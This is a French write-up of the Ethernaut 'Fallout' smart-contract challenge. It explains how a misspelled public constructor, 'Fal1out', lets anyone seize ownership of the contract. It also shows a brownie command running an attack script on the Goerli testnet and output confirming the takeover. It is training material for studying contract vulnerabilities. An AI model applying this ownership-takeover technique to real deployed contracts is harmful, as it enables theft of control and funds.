# Fallout

## Objectif
L'objectif de ce challenge est de devenir le owner du contrat.


## Devenir owner
A la lecture du contrat, la seule possibilité de devenir `owner` est à la [ligne 13](contracts/fallout.sol#L13)

Contrairement à d'autres langages orienté objet, le constructeur d'un contrat est une méthode utilisant le mot clé `constructor`.
Pour éviter des erreurs, le langage ne permet qu'une méthode ait le même nom que le contrat.

Ici le code soure compile car la fonction est nommée `Fal1out` et non `Fallout`.

La méthode `Fal1out` est `public`, il est donc possible de l'appeller pour devenir `owner` du contrat.


## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `goerli`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x40F5513a90fb7e2ac2C3E12A6d16B9279D1e94Ed) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run attack main "0x777d82B8421F781F3bd32534DD59EFC0202F5d42" --network goerli
```
```console
Brownie v1.19.0 - Python development framework for Ethereum

FalloutProject is the active project.

Running 'scripts/attack.py::main'...
Owner is hacker: False
Transaction sent: 0x6c9a6b64daa5adc6d31343f57a5d0998f170e6ab39ba10ac629307dd3e89a8a0
  Gas price: 168.3185829 gwei   Gas limit: 50267   Nonce: 20
  Transaction confirmed   Block: 7837988   Gas used: 45606 (90.73%)

Owner is hacker: True
```

